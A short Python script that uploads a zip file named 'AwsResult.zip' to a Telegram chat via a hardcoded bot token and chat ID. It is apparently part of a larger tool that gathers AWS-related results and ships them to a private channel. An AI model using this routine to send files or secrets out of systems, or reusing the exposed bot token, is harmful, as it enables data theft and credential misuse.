import os
import zipfile
import requests

def send_file_to_telegram(bot_token, chat_id, file_path):
    """Send a file to a Telegram chat using a bot."""
    url = f'https://api.telegram.org/bot{bot_token}/sendDocument'
    files = {'document': open(file_path, 'rb')}
    data = {'chat_id': chat_id}
    r = requests.post(url, files=files, data=data)
    return r.json()

# Specify your bot token and chat ID here
bot_token = '7128036007:AAHyu4YZbAZ8tAWtv3f6rRtselikW2qJX7Q'
chat_id = '-4151557739'

# Name of the zip file to be created
zip_name = 'AwsResult.zip'

# Send the zip file to Telegram
response = send_file_to_telegram(bot_token, chat_id, zip_name)
print(response)
